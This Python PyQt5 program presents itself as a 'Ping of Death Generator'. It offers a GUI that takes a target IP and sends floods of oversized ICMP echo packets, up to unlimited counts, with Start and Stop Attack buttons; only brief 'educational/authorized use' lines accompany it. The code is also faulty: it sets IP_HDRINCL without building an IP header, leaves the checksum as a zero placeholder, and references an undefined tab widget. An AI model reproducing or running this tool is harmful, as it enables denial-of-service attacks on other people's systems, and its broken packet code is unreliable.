import sys
import socket
import random
import time
from PyQt5.QtWidgets import (QApplication, QMainWindow, QWidget, QVBoxLayout, 
                             QHBoxLayout, QLabel, QLineEdit, QPushButton, 
                             QTextEdit, QMenuBar, QMenu, QAction, QStatusBar,
                             QTabWidget, QGroupBox, QCheckBox, QSpinBox)
from PyQt5.QtGui import QIcon, QColor, QPalette
from PyQt5.QtCore import Qt, QThread, pyqtSignal

class PingOfDeathWorker(QThread):
    update_signal = pyqtSignal(str)
    stats_signal = pyqtSignal(dict)

    def __init__(self, target_ip, packet_size, count, delay):
        super().__init__()
        self.target_ip = target_ip
        self.packet_size = packet_size
        self.count = count
        self.delay = delay
        self.running = True

    def run(self):
        sent = 0
        start_time = time.time()
        
        try:
            for i in range(self.count if self.count > 0 else float('inf')):
                if not self.running:
                    break
                
                try:
                    # Create a raw socket
                    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
                    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                    
                    # Craft a malicious ping packet larger than allowed (Ping of Death)
                    packet = self.create_icmp_packet(self.packet_size)
                    s.sendto(packet, (self.target_ip, 0))
                    sent += 1
                    
                    self.update_signal.emit(f"Sent oversized packet #{sent} to {self.target_ip}")
                    
                    if self.delay > 0:
                        time.sleep(self.delay / 1000.0)
                        
                    # Update stats every 10 packets
                    if sent % 10 == 0:
                        elapsed = time.time() - start_time
                        rate = sent / elapsed if elapsed > 0 else 0
                        self.stats_signal.emit({
                            'sent': sent,
                            'elapsed': elapsed,
                            'rate': rate
                        })
                        
                except Exception as e:
                    self.update_signal.emit(f"Error: {str(e)}")
                    time.sleep(1)
                    
        finally:
            elapsed = time.time() - start_time
            rate = sent / elapsed if elapsed > 0 else 0
            self.stats_signal.emit({
                'sent': sent,
                'elapsed': elapsed,
                'rate': rate,
                'completed': True
            })
            self.update_signal.emit("Attack completed or stopped")

    def create_icmp_packet(self, size):
        # This creates an invalid ICMP packet that's larger than allowed
        # Note: Actual implementation would require more complex packet crafting
        header = bytearray([8, 0, 0, 0, 0, 0, 0, 0])  # ICMP Echo Request
        data = bytearray(random.getrandbits(8) for _ in range(size - 8))
        packet = header + data
        
        # Calculate checksum (placeholder)
        checksum = 0
        packet[2:4] = checksum.to_bytes(2, 'big')
        
        return packet

    def stop(self):
        self.running = False

class CyberSecurityTool(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("Accurate Cyber Defense- Ping of Death Generator")
        self.setGeometry(100, 100, 900, 600)
        
        # Apply orange theme
        self.set_orange_theme()
        
        # Initialize UI
        self.init_ui()
        
        # Attack thread
        self.attack_thread = None
        
    def set_orange_theme(self):
        palette = self.palette()
        palette.setColor(QPalette.Window, QColor(253, 236, 166))
        palette.setColor(QPalette.WindowText, Qt.black)
        palette.setColor(QPalette.Base, QColor(255, 245, 203))
        palette.setColor(QPalette.AlternateBase, QColor(253, 236, 166))
        palette.setColor(QPalette.ToolTipBase, Qt.black)
        palette.setColor(QPalette.ToolTipText, Qt.white)
        palette.setColor(QPalette.Text, Qt.black)
        palette.setColor(QPalette.Button, QColor(255, 165, 0))
        palette.setColor(QPalette.ButtonText, Qt.black)
        palette.setColor(QPalette.BrightText, Qt.red)
        palette.setColor(QPalette.Highlight, QColor(255, 140, 0))
        palette.setColor(QPalette.HighlightedText, Qt.black)
        self.setPalette(palette)
        
    def init_ui(self):
        # Create menu bar
        self.create_menu_bar()
        
        # Create status bar
        self.status_bar = QStatusBar()
        self.setStatusBar(self.status_bar)
        self.status_bar.showMessage("Ready")
        
        # Main widget
        main_widget = QWidget()
        self.setCentralWidget(main_widget)
        
        # Main layout
        main_layout = QVBoxLayout()
        main_widget.setLayout(main_layout)
        
        # Create tabs
        tabs = QTabWidget()
        main_layout.addWidget(tabs)
        
        # Ping of Death tab
        pod_tab = QWidget()
        tabs.addTab(pod_tab, "Ping of Death")
        self.setup_pod_tab(pod_tab)
        
        # Dashboard tab
        dashboard_tab = QWidget()
        tabs.addTab(dashboard_tab, "Dashboard")
        self.setup_dashboard_tab(dashboard_tab)
        
        # Settings tab
        settings_tab = QWidget()
        tabs.addTab(settings_tab, "Settings")
        self.setup_settings_tab(settings_tab)
        
    def create_menu_bar(self):
        menubar = self.menuBar()
        
        # File menu
        file_menu = menubar.addMenu('File')
        
        exit_action = QAction('Exit', self)
        exit_action.setShortcut('Ctrl+Q')
        exit_action.triggered.connect(self.close)
        file_menu.addAction(exit_action)
        
        # Tools menu
        tools_menu = menubar.addMenu('Tools')
        
        pod_action = QAction('Ping of Death', self)
        pod_action.triggered.connect(lambda: self.tab_widget.setCurrentIndex(0))
        tools_menu.addAction(pod_action)
        
        # View menu
        view_menu = menubar.addMenu('View')
        
        # About menu
        about_menu = menubar.addMenu('About')
        
        about_action = QAction('About', self)
        about_action.triggered.connect(self.show_about)
        about_menu.addAction(about_action)
        
        # Help menu
        help_menu = menubar.addMenu('Help')
        
        help_action = QAction('Help', self)
        help_action.triggered.connect(self.show_help)
        help_menu.addAction(help_action)
        
    def setup_pod_tab(self, tab):
        layout = QVBoxLayout()
        tab.setLayout(layout)
        
        # Target group
        target_group = QGroupBox("Target Configuration")
        target_layout = QVBoxLayout()
        
        # IP address input
        ip_layout = QHBoxLayout()
        ip_label = QLabel("Target IP:")
        self.ip_input = QLineEdit()
        self.ip_input.setPlaceholderText("Enter target IP address")
        ip_layout.addWidget(ip_label)
        ip_layout.addWidget(self.ip_input)
        target_layout.addLayout(ip_layout)
        
        # Packet size
        size_layout = QHBoxLayout()
        size_label = QLabel("Packet Size (bytes):")
        self.size_input = QSpinBox()
        self.size_input.setRange(1, 65500)
        self.size_input.setValue(65500)
        size_layout.addWidget(size_label)
        size_layout.addWidget(self.size_input)
        target_layout.addLayout(size_layout)
        
        # Attack settings
        attack_group = QGroupBox("Attack Settings")
        attack_layout = QVBoxLayout()
        
        # Count
        count_layout = QHBoxLayout()
        count_label = QLabel("Packet Count (0 for unlimited):")
        self.count_input = QSpinBox()
        self.count_input.setRange(0, 1000000)
        self.count_input.setValue(100)
        count_layout.addWidget(count_label)
        count_layout.addWidget(self.count_input)
        attack_layout.addLayout(count_layout)
        
        # Delay
        delay_layout = QHBoxLayout()
        delay_label = QLabel("Delay between packets (ms):")
        self.delay_input = QSpinBox()
        self.delay_input.setRange(0, 10000)
        self.delay_input.setValue(100)
        delay_layout.addWidget(delay_label)
        delay_layout.addWidget(self.delay_input)
        attack_layout.addLayout(delay_layout)
        
        attack_group.setLayout(attack_layout)
        target_layout.addWidget(attack_group)
        
        # Buttons
        button_layout = QHBoxLayout()
        self.start_button = QPushButton("Start Attack")
        self.start_button.clicked.connect(self.start_attack)
        self.stop_button = QPushButton("Stop Attack")
        self.stop_button.clicked.connect(self.stop_attack)
        self.stop_button.setEnabled(False)
        button_layout.addWidget(self.start_button)
        button_layout.addWidget(self.stop_button)
        target_layout.addLayout(button_layout)
        
        target_group.setLayout(target_layout)
        layout.addWidget(target_group)
        
        # Output
        output_group = QGroupBox("Output")
        output_layout = QVBoxLayout()
        self.output_text = QTextEdit()
        self.output_text.setReadOnly(True)
        output_layout.addWidget(self.output_text)
        output_group.setLayout(output_layout)
        layout.addWidget(output_group)
        
        # Stats
        stats_group = QGroupBox("Statistics")
        stats_layout = QHBoxLayout()
        
        self.sent_label = QLabel("Packets Sent: 0")
        self.elapsed_label = QLabel("Elapsed Time: 0s")
        self.rate_label = QLabel("Rate: 0 pkt/s")
        
        stats_layout.addWidget(self.sent_label)
        stats_layout.addWidget(self.elapsed_label)
        stats_layout.addWidget(self.rate_label)
        
        stats_group.setLayout(stats_layout)
        layout.addWidget(stats_group)
        
    def setup_dashboard_tab(self, tab):
        layout = QVBoxLayout()
        tab.setLayout(layout)
        
        label = QLabel("Dashboard - Coming Soon")
        label.setAlignment(Qt.AlignCenter)
        layout.addWidget(label)
        
    def setup_settings_tab(self, tab):
        layout = QVBoxLayout()
        tab.setLayout(layout)
        
        label = QLabel("Settings - Coming Soon")
        label.setAlignment(Qt.AlignCenter)
        layout.addWidget(label)
        
    def start_attack(self):
        target_ip = self.ip_input.text().strip()
        if not target_ip:
            self.output_text.append("Error: Please enter a target IP address")
            return
            
        packet_size = self.size_input.value()
        count = self.count_input.value()
        delay = self.delay_input.value()
        
        self.output_text.append(f"Starting Ping of Death attack on {target_ip}")
        self.output_text.append(f"Packet size: {packet_size} bytes")
        self.output_text.append(f"Count: {'Unlimited' if count == 0 else count}")
        self.output_text.append(f"Delay: {delay} ms")
        
        self.start_button.setEnabled(False)
        self.stop_button.setEnabled(True)
        
        self.attack_thread = PingOfDeathWorker(target_ip, packet_size, count, delay)
        self.attack_thread.update_signal.connect(self.update_output)
        self.attack_thread.stats_signal.connect(self.update_stats)
        self.attack_thread.finished.connect(self.attack_finished)
        self.attack_thread.start()
        
    def stop_attack(self):
        if self.attack_thread:
            self.output_text.append("Stopping attack...")
            self.attack_thread.stop()
            self.stop_button.setEnabled(False)
            
    def attack_finished(self):
        self.start_button.setEnabled(True)
        self.stop_button.setEnabled(False)
        self.status_bar.showMessage("Attack completed")
        
    def update_output(self, message):
        self.output_text.append(message)
        self.status_bar.showMessage(message)
        
    def update_stats(self, stats):
        self.sent_label.setText(f"Packets Sent: {stats['sent']}")
        self.elapsed_label.setText(f"Elapsed Time: {stats['elapsed']:.2f}s")
        self.rate_label.setText(f"Rate: {stats['rate']:.2f} pkt/s")
        
        if stats.get('completed', False):
            self.attack_finished()
            
    def show_about(self):
        self.output_text.append("\nAbout Cybersecurity Tool")
        self.output_text.append("Version: 1.0")
        self.output_text.append("Created for educational purposes only")
        self.output_text.append("Unauthorized use is illegal\n")
        
    def show_help(self):
        self.output_text.append("\nHelp Information")
        self.output_text.append("1. Enter target IP address")
        self.output_text.append("2. Configure packet size (typically large for PoD)")
        self.output_text.append("3. Set packet count (0 for unlimited)")
        self.output_text.append("4. Set delay between packets in milliseconds")
        self.output_text.append("5. Click Start Attack to begin")
        self.output_text.append("6. Click Stop Attack to stop\n")
        self.output_text.append("WARNING: This tool is for authorized testing only!\n")

if __name__ == '__main__':
    app = QApplication(sys.argv)
    
    # Set application style
    app.setStyle('Fusion')
    
    # Create and show main window
    window = CyberSecurityTool()
    window.show()
    
    sys.exit(app.exec_())